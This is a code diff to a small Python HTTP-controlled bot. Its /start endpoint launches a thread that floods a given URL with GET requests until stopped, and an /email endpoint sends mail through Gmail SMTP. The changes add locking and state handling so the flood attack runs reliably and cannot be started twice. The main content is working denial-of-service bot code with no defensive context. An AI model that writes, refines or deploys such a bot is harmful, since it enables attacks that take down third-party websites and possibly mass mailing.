@@ -12,7 +12,7 @@ from email.mime.text import MIMEText
 
 
 class Bot(BaseHTTPRequestHandler):
-    status = {'action': 'Idle', 'targets': []}  # TODO list of actions
+    status = {'action': 'Idle', 'target': None}
     lock = threading.Lock()
     stop = threading.Event()
     smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
@@ -36,9 +36,13 @@ class Bot(BaseHTTPRequestHandler):
             if self.status['action'] == 'Idle':
                 self.send_response(406)
             else:
+                with self.lock:
+                    self.status['action'] = "Idle"
+                    self.status['target'] = None
                 self.send_response(200)
+                self.stop.set()
+
             self.end_headers()
-            self.stop.set()
 
         else:
             self.send_response(404)
@@ -46,7 +50,12 @@ class Bot(BaseHTTPRequestHandler):
 
     def do_POST(self):
         if self.path == '/start':
-            self.__start_attack()
+            with self.lock:
+                action = self.status['action']
+            if action == "Idle":
+                self.__start_attack()
+            else:
+                self.send_response(403)
         elif self.path == '/email':
             self.__start_email()
         else:
@@ -79,6 +88,10 @@ class Bot(BaseHTTPRequestHandler):
 
         self.stop.clear()
 
+        with self.lock:
+            self.status['action'] = "Attacking"
+            self.status['target'] = url
+
         attack = threading.Thread(target=Bot.__attack, args=(self, url))
         attack.start()
         self.send_response(200)
@@ -93,16 +106,9 @@ class Bot(BaseHTTPRequestHandler):
             return self.status
 
     def __attack(self, url):
-        with self.lock:
-            self.status['action'] = "Attacking"
-            self.status['targets'].append(url)
 
         while not self.stop.is_set():
             print(f"Request sent to {url}, status code:{requests.get(url).status_code}")
-
-        with self.lock:
-            self.status['action'] = "Idle"
-            self.status['targets'].clear()
 
     def __email(self, emails, subj, text):
         with self.lock:
